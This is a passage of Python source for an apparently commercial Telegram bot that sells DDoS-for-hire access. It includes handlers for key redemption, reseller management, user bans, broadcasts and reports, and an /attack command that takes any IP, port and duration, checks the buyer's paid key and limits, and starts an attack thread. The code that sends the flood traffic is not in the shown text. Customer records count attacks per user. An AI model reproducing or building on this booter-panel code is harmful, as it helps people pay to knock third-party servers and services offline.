                bot.copy_message(uid, data['message'].chat.id, data['message'].message_id)
            sent_count += 1
        except:
            failed_count += 1
    bot.reply_to(message, f"Reseller Broadcast Sent!\n\nTotal: {len(data['users'])}\nDelivered: {sent_count}\nFailed: {failed_count}")

@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /redeem <key>\n\nExample: /redeem @GAURAV_BHAI1-A1B2C3D4E5F6")
        return
    key_input = command_parts[1].strip()
    key_doc = keys_collection.find_one({'key': key_input})
    if not key_doc:
        bot.reply_to(message, f"Invalid key!\n\nTumne di: <code>{key_input}</code>", parse_mode="HTML")
        return
    max_users = key_doc.get('max_users', 1)
    current_users = key_doc.get('current_users', 0)
    if key_doc['used'] and current_users >= max_users:
        bot.reply_to(message, "Ye key pehle se use ho chuki hai!")
        return
    if key_doc.get('is_trail'):
        user_data = users_collection.find_one({'user_id': user_id})
        if user_data and user_data.get('key_expiry') and user_data['key_expiry'] > datetime.now():
            abuse_count = user_data.get('trail_abuse_count', 0) + 1
            users_collection.update_one({'user_id': user_id}, {'$set': {'trail_abuse_count': abuse_count}})
            if abuse_count == 1:
                bot.reply_to(message, "Warning: Aap trail key se time extend nahi kar sakte!")
            else:
                ban_minutes = 10 * (2 ** (abuse_count - 2))
                ban_expiry = datetime.now() + timedelta(minutes=ban_minutes)
                users_collection.update_one({'user_id': user_id}, {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}})
                bot.reply_to(message, f"Trail key abuse ki wajah se aapko {ban_minutes} minutes ke liye ban kar diya gaya hai!")
            return
    user = users_collection.find_one({'user_id': user_id})
    reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': key_input, 'key_expiry': new_expiry, 'key_duration_seconds': key_doc['duration_seconds'], 'key_duration_label': key_doc['duration_label'], 'redeemed_at': datetime.now(), 'reseller_username': reseller_username}})
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one({'key': key_input}, {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}})
        else:
            keys_collection.update_one({'key': key_input}, {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}})
        new_remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"<b>Key Extended!</b>\n\n<b>Key:</b> <code>{key_input}</code>\n<b>Added:</b> {key_doc['duration_label']}\n<b>Total Time:</b> {new_remaining}", parse_mode="HTML")
    else:
        expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
        users_collection.update_one({'user_id': user_id}, {'$set': {'user_id': user_id, 'username': user_name, 'key': key_input, 'key_expiry': expiry_time, 'key_duration_seconds': key_doc['duration_seconds'], 'key_duration_label': key_doc['duration_label'], 'redeemed_at': datetime.now(), 'reseller_username': reseller_username}}, upsert=True)
        new_current = current_users + 1
        if new_current >= max_users:
            keys_collection.update_one({'key': key_input}, {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}})
        else:
            keys_collection.update_one({'key': key_input}, {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}})
        remaining = get_time_remaining(user_id)
        bot.reply_to(message, f"<b>Key Redeemed!</b>\n\n<b>Key:</b> <code>{key_input}</code>\n<b>Duration:</b> {key_doc['duration_label']}\n<b>Time Left:</b> {remaining}", parse_mode="HTML")

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    user = users_collection.find_one({'user_id': user_id})
    if not user or not user.get('key'):
        bot.reply_to(message, "Tumhare paas koi key nahi hai!")
        return
    if not has_valid_key(user_id):
        reseller_username = user.get('reseller_username')
        if reseller_username:
            bot.reply_to(message, f"Key khatam ho gayi!\n\nRenew ke liye DM karo: @{reseller_username}")
        else:
            bot.reply_to(message, "Key khatam ho gayi!")
        return
    remaining = get_time_remaining(user_id)
    bot.reply_to(message, f"<b>Key Details</b>\n\n<b>Key:</b> <code>{user['key']}</code>\n<b>Remaining:</b> {remaining}\n<b>Status:</b> Active", parse_mode="HTML")

@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    if not is_owner(user_id) and not has_valid_key(user_id):
        bot.reply_to(message, "Pehle key purchase karo!")
        return
    response = generate_global_status_ui()
    sent_msg = bot.reply_to(message, response, parse_mode="HTML")
    def update_status_loop():
        for _ in range(30):
            time.sleep(2)
            if not active_attacks:
                break
            new_response = generate_global_status_ui()
            try:
                bot.edit_message_text(new_response, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
            except:
                break
    if active_attacks:
        thread = threading.Thread(target=update_status_loop)
        thread.daemon = True
        thread.start()

@bot.message_handler(commands=["extend"])
def extend_key_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /extend <id or @username> <time>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "User nahi mila!")
        return
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    if not duration:
        bot.reply_to(message, "Invalid duration!")
        return
    user = users_collection.find_one({'user_id': target_user_id})
    if not user:
        bot.reply_to(message, "User key database mein nahi mila!")
        return
    if user.get('key_expiry') and user['key_expiry'] > datetime.now():
        new_expiry = user['key_expiry'] + duration
    else:
        new_expiry = datetime.now() + duration
    users_collection.update_one({'user_id': target_user_id}, {'$set': {'key_expiry': new_expiry}})
    new_remaining = format_timedelta(new_expiry - datetime.now())
    try:
        bot.send_message(target_user_id, f"Time Extended!\n\nAdded: {duration_label}\nTotal Time: {new_remaining}\n\nEnjoy!")
    except:
        pass
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    bot.reply_to(message, f"Time Extended!\n\nUser: {display}\nID: {target_user_id}\nAdded: {duration_label}\nNew Time: {new_remaining}")

@bot.message_handler(commands=["extend_all"])
def extend_all_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /extend_all <time>")
        return
    duration_str = command_parts[1].lower()
    duration, duration_label = parse_duration(duration_str)
    if not duration:
        bot.reply_to(message, "Invalid duration!")
        return
    all_users = list(users_collection.find({'key': {'$ne': None}}))
    if not all_users:
        bot.reply_to(message, "Koi user nahi hai jinke paas key ho!")
        return
    extended_count = 0
    notified_count = 0
    for user in all_users:
        uid = user['user_id']
        old_expiry = user.get('key_expiry')
        if old_expiry and old_expiry > datetime.now():
            new_expiry = old_expiry + duration
        else:
            new_expiry = datetime.now() + duration
        users_collection.update_one({'user_id': uid}, {'$set': {'key_expiry': new_expiry}})
        extended_count += 1
        try:
            bot.send_message(uid, f"Time Extended for ALL Users!\n\nAdded: {duration_label}\n\nEnjoy!")
            notified_count += 1
        except:
            pass
    bot.reply_to(message, f"Done! Sabka time extend ho gaya.\n\nTotal Users: {extended_count}\nNotified: {notified_count}\nAdded: {duration_label}")

@bot.message_handler(commands=["down"])
def down_key_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /down <id or @username> <time>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "User nahi mila!")
        return
    duration_str = command_parts[2].lower()
    duration, duration_label = parse_duration(duration_str)
    if not duration:
        bot.reply_to(message, "Invalid duration!")
        return
    user = users_collection.find_one({'user_id': target_user_id})
    if not user:
        bot.reply_to(message, "User key database mein nahi mila!")
        return
    if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
        bot.reply_to(message, "User ke paas active key nahi hai!")
        return
    new_expiry = user['key_expiry'] - duration
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    if new_expiry <= datetime.now():
        users_collection.update_one({'user_id': target_user_id}, {'$set': {'key': None, 'key_expiry': None}})
        bot.reply_to(message, f"Key Expired!\n\nUser: {display}\nID: {target_user_id}\nKey removed!")
    else:
        users_collection.update_one({'user_id': target_user_id}, {'$set': {'key_expiry': new_expiry}})
        new_remaining = format_timedelta(new_expiry - datetime.now())
        bot.reply_to(message, f"Time Reduced!\n\nUser: {display}\nID: {target_user_id}\nReduced: {duration_label}\nNew Time: {new_remaining}")

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /delkey <key>")
        return
    key_input = command_parts[1].strip()
    result = keys_collection.delete_one({'key': key_input})
    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        bot.reply_to(message, f"Key <code>{key_input}</code> deleted!", parse_mode="HTML")
    else:
        bot.reply_to(message, "Key nahi mili!")

@bot.message_handler(commands=["delete_key"])
def delete_key_alt_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /delete_key <key>")
        return
    key_input = command_parts[1].strip()
    result = keys_collection.delete_one({'key': key_input})
    if result.deleted_count > 0:
        users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
        bot.reply_to(message, f"Key <code>{key_input}</code> deleted!", parse_mode="HTML")
    else:
        bot.reply_to(message, "Key nahi mili!")

@bot.message_handler(commands=["key"])
def key_details_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /key <key>")
        return
    key_input = command_parts[1].strip()
    key_doc = keys_collection.find_one({'key': key_input})
    if not key_doc:
        bot.reply_to(message, "Key nahi mili!")
        return
    response = "KEY DETAILS\n===========\n\n"
    response += f"Key: <code>{key_input}</code>\nDuration: {key_doc.get('duration_label', 'Unknown')}\nSeconds: {key_doc.get('duration_seconds', 0)}\nCreated: {key_doc.get('created_at', 'Unknown')}\n"
    creator_type = key_doc.get('created_by_type', 'owner')
    if creator_type == 'reseller':
        creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
        response += f"Creator: {creator} (Reseller)\n"
    else:
        response += f"Creator: OWNER\n"
    response += f"\nStatus: {'USED' if key_doc.get('used') else 'UNUSED'}\n"
    if key_doc.get('used'):
        response += f"Used By: <code>{key_doc.get('used_by', 'Unknown')}</code>\nUsed At: {key_doc.get('used_at', 'Unknown')}\n"
        user = users_collection.find_one({'key': key_input})
        if user:
            response += f"\n--- USER INFO ---\nUsername: {user.get('username', 'Unknown')}\nID: <code>{user.get('user_id', 'Unknown')}</code>\n"
            expiry = user.get('key_expiry')
            if expiry:
                if expiry > datetime.now():
                    remaining = format_timedelta(expiry - datetime.now())
                    response += f"Remaining: {remaining}\nStatus: ACTIVE\n"
                else:
                    response += f"Status: EXPIRED\n"
    response += "\n==========="
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=["allkeys"])
def list_keys_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    unused_keys = list(keys_collection.find({'used': False}))
    used_keys = list(keys_collection.find({'used': True}).sort('used_at', -1))
    content = "ALL KEYS REPORT\n"
    content += f"Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n\n"
    content += f"UNUSED KEYS ({len(unused_keys)})\n--------------------\n"
    for i, key in enumerate(unused_keys, 1):
        content += f"{i}. {key['key']}\n   Duration: {key.get('duration_label', 'N/A')}\n   Created: {key.get('created_at', 'N/A')}\n"
        if key.get('created_by_username'):
            content += f"   By: {key.get('created_by_username')}\n"
        content += "\n"
    if not unused_keys:
        content += "   No unused keys\n\n"
    content += f"\nUSED KEYS ({len(used_keys)})\n--------------------\n"
    for i, key in enumerate(used_keys, 1):
        content += f"{i}. {key['key']}\n   Duration: {key.get('duration_label', 'N/A')}\n   Used by: {key.get('used_by', 'N/A')}\n"
        if key.get('used_at'):
            content += f"   Used at: {key['used_at'].strftime('%d-%m-%Y %H:%M')}\n"
        if key.get('created_by_username'):
            content += f"   Created by: {key.get('created_by_username')}\n"
        content += "\n"
    if not used_keys:
        content += "   No used keys\n"
    content += f"\nTOTAL: {len(unused_keys)} unused | {len(used_keys)} used"
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    bot.send_document(message.chat.id, file, caption=f"All Keys Report\n\nUnused: {len(unused_keys)}\nUsed: {len(used_keys)}")

@bot.message_handler(commands=["allusers"])
def all_users_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    all_users = list(users_collection.find({'key': {'$ne': None}}).sort('key_expiry', -1))
    if not all_users:
        bot.reply_to(message, "Koi user nahi hai!")
        return
    active_users = []
    expired_users = []
    for user in all_users:
        if user.get('key_expiry') and user['key_expiry'] > datetime.now():
            active_users.append(user)
        else:
            expired_users.append(user)
    content = "ALL USERS REPORT\n"
    content += f"Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n\n"
    content += f"ACTIVE USERS ({len(active_users)})\n--------------------\n"
    for i, user in enumerate(active_users, 1):
        remaining = user['key_expiry'] - datetime.now()
        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)
        time_str = f"{days}d {hours}h {minutes}m"
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        content += f"{i}. {user.get('username', 'Unknown')}\n   ID: {user['user_id']}\n   Key: {user.get('key', 'N/A')}\n   Duration: {user.get('key_duration_label', 'N/A')}\n   Time Left: {time_str}\n   Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n   Total Attacks: {attack_count}\n"
        if user.get('reseller_username'):
            content += f"   Reseller: @{user['reseller_username']}\n"
        content += "\n"
    if not active_users:
        content += "   No active users\n\n"
    content += f"\nEXPIRED USERS ({len(expired_users)})\n--------------------\n"
    for i, user in enumerate(expired_users, 1):
        attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
        content += f"{i}. {user.get('username', 'Unknown')}\n   ID: {user['user_id']}\n   Key: {user.get('key', 'N/A')}\n"
        if user.get('key_expiry'):
            content += f"   Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
        content += f"   Total Attacks: {attack_count}\n\n"
    if not expired_users:
        content += "   No expired users\n"
    content += f"\nTOTAL: {len(active_users)} Active | {len(expired_users)} Expired"
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"all_users_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    bot.send_document(message.chat.id, file, caption=f"All Users Report\n\nActive: {len(active_users)}\nExpired: {len(expired_users)}")

pending_del_exp = {}
pending_del_exp_key = {}

@bot.message_handler(commands=["del_exp_usr"])
def del_exp_usr_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    user_id = message.from_user.id
    all_users = list(users_collection.find({'key': {'$ne': None}}))
    expired_users = []
    for user in all_users:
        if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
            expired_users.append(user)
    if not expired_users:
        bot.reply_to(message, "Koi expired user nahi hai!")
        return
    pending_del_exp[user_id] = expired_users
    bot.reply_to(message, f"{len(expired_users)} expired users milein!\n\nConfirm: /confirm_del_exp\nCancel: /cancel_del")

@bot.message_handler(commands=["confirm_del_exp"])
def confirm_del_exp_command(message):
    if not is_owner(message.from_user.id):
        return
    user_id = message.from_user.id
    if user_id not in pending_del_exp:
        bot.reply_to(message, "Pehle /del_exp_usr karo!")
        return
    expired_users = pending_del_exp[user_id]
    del pending_del_exp[user_id]
    deleted_count = 0
    for user in expired_users:
        try:
            users_collection.delete_one({'user_id': user['user_id']})
            deleted_count += 1
        except:
            pass
    bot.reply_to(message, f"{deleted_count} expired users delete ho gaye!")

@bot.message_handler(commands=["cancel_del"])
def cancel_del_command(message):
    if not is_owner(message.from_user.id):
        return
    user_id = message.from_user.id
    cancelled = False
    if user_id in pending_del_exp:
        del pending_del_exp[user_id]
        cancelled = True
    if user_id in pending_del_exp_key:
        del pending_del_exp_key[user_id]
        cancelled = True
    if cancelled:
        bot.reply_to(message, "Delete operation cancelled!")
    else:
        bot.reply_to(message, "Koi pending delete nahi hai.")

@bot.message_handler(commands=["del_exp_key"])
def del_exp_key_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    user_id = message.from_user.id
    all_used_keys = list(keys_collection.find({'used': True}))
    expired_keys = []
    for key in all_used_keys:
        user = users_collection.find_one({'key': key['key']})
        if user:
            if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
                expired_keys.append(key)
        else:
            expired_keys.append(key)
    if not expired_keys:
        bot.reply_to(message, "Koi expired key nahi hai!")
        return
    pending_del_exp_key[user_id] = expired_keys
    bot.reply_to(message, f"{len(expired_keys)} expired keys milein!\n\nConfirm: /confirm_del_exp_key\nCancel: /cancel_del")

@bot.message_handler(commands=["confirm_del_exp_key"])
def confirm_del_exp_key_command(message):
    if not is_owner(message.from_user.id):
        return
    user_id = message.from_user.id
    if user_id not in pending_del_exp_key:
        bot.reply_to(message, "Pehle /del_exp_key karo!")
        return
    expired_keys = pending_del_exp_key[user_id]
    del pending_del_exp_key[user_id]
    deleted_count = 0
    for key in expired_keys:
        try:
            keys_collection.delete_one({'key': key['key']})
            deleted_count += 1
        except:
            pass
    bot.reply_to(message, f"{deleted_count} expired keys delete ho gayi!")

@bot.message_handler(commands=["feedback_on"])
def feedback_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    set_feedback_enabled(True)
    bot.reply_to(message, "Feedback enabled! Users must send screenshot after each attack.")

@bot.message_handler(commands=["feedback_off"])
def feedback_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    set_feedback_enabled(False)
    bot.reply_to(message, "Feedback disabled! Users can attack without sending screenshot.")

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_group = message.chat.type not in ['private', 'personal']
    if is_group:
        if not check_group_approval(message):
            return
    else:
        if not has_valid_key(user_id):
            user = users_collection.find_one({'user_id': user_id})
            if user and user.get('reseller_username'):
                bot.reply_to(message, f"Key khatam ho gayi!\nRenew ke liye DM karo: @{user.get('reseller_username')}")
            else:
                bot.reply_to(message, "Tumhare paas valid key nahi hai!\nKey kharidne ke liye reseller se contact karo.")
            return
    if protection.is_ddos_attack(user_id, message.chat.id):
        bot.reply_to(message, "DDoS Protection: Too many requests! Wait 5 seconds.")
        return
    if not check_channel_join(message):
        return
    if get_feedback_enabled() and not is_owner(user_id):
        fb = get_pending_feedback(user_id)
        if fb:
            bot.reply_to(message, f"Pehle attack ka screenshot bhejo!\nTarget: {fb['target']} {fb['port']} Duration: {fb['duration']}s")
            return
        cooldown = get_user_cooldown(user_id, is_group)
        if cooldown > 0:
            bot.reply_to(message, f"Cooldown active! Wait: {cooldown}s")
            return
        if user_has_active_attack(user_id):
            bot.reply_to(message, "Tumhara pehle se ek attack chal raha hai!")
            return
    active_count = get_active_attack_count()
    max_concurrent = len(API_LIST)
    if active_count >= max_concurrent:
        bot.reply_to(message, f"Abhi chudai lgi hui hai! ({active_count}/{max_concurrent})\n\n/status se check kro")
        return
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
        return
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    if not validate_target(target):
        bot.reply_to(message, "Invalid IP!")
        return
    if is_ip_blocked(target):
        bot.reply_to(message, "Ye IP blocked hai! Dusra IP use karo.")
        return
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "Invalid port! (1-65535)")
            return
        duration = int(duration)
        if is_group:
            max_time = get_group_max_attack_time()
            cooldown_time = get_group_cooldown()
        else:
            max_time = get_private_max_attack_time()
            cooldown_time = get_private_cooldown()
        if not is_owner(user_id) and duration > max_time:
            bot.reply_to(message, f"Max time: {max_time}s")
            return
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        if api_index is None:
            bot.reply_to(message, "Koi free slot nahi mila! Wait karo.")
            return
        with _attack_lock:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time + duration)
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()
            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {'target': target, 'port': port, 'duration': duration, 'user_id': user_id, 'start_time': datetime.now(), 'end_time': datetime.now() + timedelta(seconds=duration), 'is_group': is_group}
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index, is_group))
        thread.start()
    except ValueError:
        bot.reply_to(message, "Port and time must be numbers!")

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    if is_owner(user_id):
        help_text = f'''👑 OWNER PANEL

🔑 KEY MGMT
• /gen — Generate keys
• /key — Key details
• /allkeys — All keys list
• /delkey /delete_key — Delete key
• /del_exp_key — Delete expired keys
• /trail (or /trial) — Trail key
• /reseller_trail (or /reseller_trial) — Trail to resellers
• /del_trail — Delete all trail keys

👥 USER MGMT
• /user — User info
• /allusers — All users list
• /extend — Extend user time
• /extend_all — Extend all users
• /down — Reduce user time
• /del_exp_usr — Delete expired users
• /ban — Permanent ban
• /tban — Temporary ban
• /unban — Remove ban
• /banned — Banned users list

💼 RESELLER
• /add_reseller — Add reseller
• /remove_reseller — Remove reseller
• /block_reseller — Block reseller
• /unblock_reseller — Unblock reseller
• /all_resellers — All resellers
• /saldo_add — Add balance
• /saldo_remove — Remove balance
• /saldo — Check balance
• /user_resell — Reseller's users
• /setprice — Change prices

📢 BROADCAST
• /broadcast — All users
• /broadcast_reseller — Resellers only
• /broadcast_paid — Paid users only

⚡ ATTACK
• /attack — Start attack
• /status — Live attacks
• /settings — Bot settings
• /private_max — Set private max time
• /group_max — Set group max time
• /private_cooldown — Set private cooldown
• /group_cooldown — Set group cooldown

🛡️ PROTECTION
• /ddos_on /ddos_off — DDoS protection
• /required_on /required_off — Channel requirement
• /block_ip — Block IP prefix
• /unblock_ip — Unblock IP
• /blocked_ips — List blocked IPs

📢 GROUP
• /addgrp — Approve group
• /removegrp — Remove group
• /groups — List approved groups
• /channels — Channel info

🎬 REEL
• /reel_on /reel_off — Toggle reel
• /addreel — Add reel
• /removereel — Remove reel
• /listreels — List reels

⚙️ SETUP
• /setcanary /setios /setandroid — Set files
• /setupstatus — Setup status
• /delsetup — Delete setup

📸 FEEDBACK
• /feedback_on /feedback_off

📊 MONITOR
• /live — Server stats
• /logs — Attack logs
• /del_logs — Delete logs

🔧 MAINTENANCE
• /maintenance — Turn ON
• /ok — Turn OFF

━━━━━━━━━━━━━━━━━━
🔢 Max Concurrent: {len(API_LIST)}'''
    elif is_reseller(user_id):
        help_text = f'''💼 RESELLER PANEL

🆔 BASIC
• /id — Your ID
• /ping — Bot status

💰 BALANCE
• /mysaldo — Check balance
• /prices — Key prices

🔑 KEY GEN
• /gen <duration> <count> — Generate keys
  Example: /gen 1d 5

⚡ ATTACK
• /redeem — Redeem key
• /attack — Start attack
• /status — Live attacks
• /mykey — Your key

━━━━━━━━━━━━━━━━━━
🔢 Max Concurrent: {len(API_LIST)}'''
    else:
        help_text = '''╭━━━〔 💎 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 ━━╮
┃
┃  ◈  ⚡  /attack
┃  ◈  📊  /status
┃  ◈  📦  /mykey
┃  ◈  🔑  /redeem
┃  ◈  ✅  /verify
┃  ◈  🆔  /id
┃
╰━━━━━━━━━━━━━━╯

╭━━━━━━〔 ⚙️ 𝗦𝗘𝗧𝗨𝗣 〕━━━━╮
┃
┃  ◈  📦  /canary
┃  ◈  🍎  /ios
┃  ◈  🤖  /android
┃
╰━━━━━━━━━━━━━━━━━━╯

╭━━━━━〔 👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 〕━━━━╮
┃  𝗙𝗔𝗦𝗧  •  💎 𝗣𝗥𝗢 • 𝗦𝗘𝗖𝗨𝗥𝗘
╰━━━━━━━━━━━━━━━━ ━━━╯'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=["del_trail"])
def delete_trail_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) == 1:
        bot.reply_to(message, "Confirm: /del_trail confirm")
        return
    if command_parts[1].lower() == "confirm":
        result = keys_collection.delete_many({'is_trail': True})
        bot.reply_to(message, f"{result.deleted_count} trail keys delete ho gayi!")
    else:
        bot.reply_to(message, "Confirmation failed! /del_trail confirm")

@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "Usage: /tban <id> <time>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "User nahi mila!")
        return
    if target_user_id == BOT_OWNER:
        bot.reply_to(message, "Owner ko ban nahi kar sakte!")
        return
    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)
    if not duration_td:
        bot.reply_to(message, "Invalid duration! Use: 10m, 1h, 1d")
        return
    ban_expiry = datetime.now() + duration_td
    users_collection.update_one({'user_id': target_user_id}, {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}}, upsert=True)
    bot.reply_to(message, f"User {resolved_name or target_user_id} ko {label} ke liye ban kar diya!\nExpiry: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}")

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /ban <id>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "User nahi mila!")
        return
    if target_user_id == BOT_OWNER:
        bot.reply_to(message, "Owner ko ban nahi kar sakte!")
        return
    users_collection.update_one({'user_id': target_user_id}, {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}}, upsert=True)
    try:
        bot.send_message(target_user_id, "Aapko ban kar diya gaya hai!")
    except:
        pass
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    bot.reply_to(message, f"User {display} banned!\nID: {target_user_id}")

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /unban <id>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "User nahi mila!")
        return
    result = users_collection.update_one({'user_id': target_user_id}, {'$set': {'banned': False}})
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    if result.modified_count > 0:
        try:
            bot.send_message(target_user_id, "Aapka ban hata diya gaya hai!")
        except:
            pass
        bot.reply_to(message, f"User {display} unbanned!\nID: {target_user_id}")
    else:
        bot.reply_to(message, "User nahi mila ya pehle se unbanned hai!")

@bot.message_handler(commands=["banned"])
def list_banned_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    banned_users = list(users_collection.find({'banned': True}))
    if not banned_users:
        bot.reply_to(message, "Koi banned user nahi hai!")
        return
    response = "BANNED USERS\n============\n\n"
    for i, user in enumerate(banned_users[:20], 1):
        response += f"{i}. {user['user_id']}\n"
        if user.get('username'):
            response += f"   {user['username']}\n"
    response += f"\n============\nTotal Banned: {len(banned_users)}"
    send_long_message(message, response)

@bot.message_handler(commands=["user"])
def user_info_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
        return
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "Usage: /user <id>")
        return
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "User nahi mila!")
        return
    user = users_collection.find_one({'user_id': target_user_id})
    reseller = resellers_collection.find_one({'user_id': target_user_id})
    bot_user = bot_users_collection.find_one({'user_id': target_user_id})
    response = "USER INFO\n=========\n\n"
    response += f"ID: <code>{target_user_id}</code>\n"
    if resolved_name:
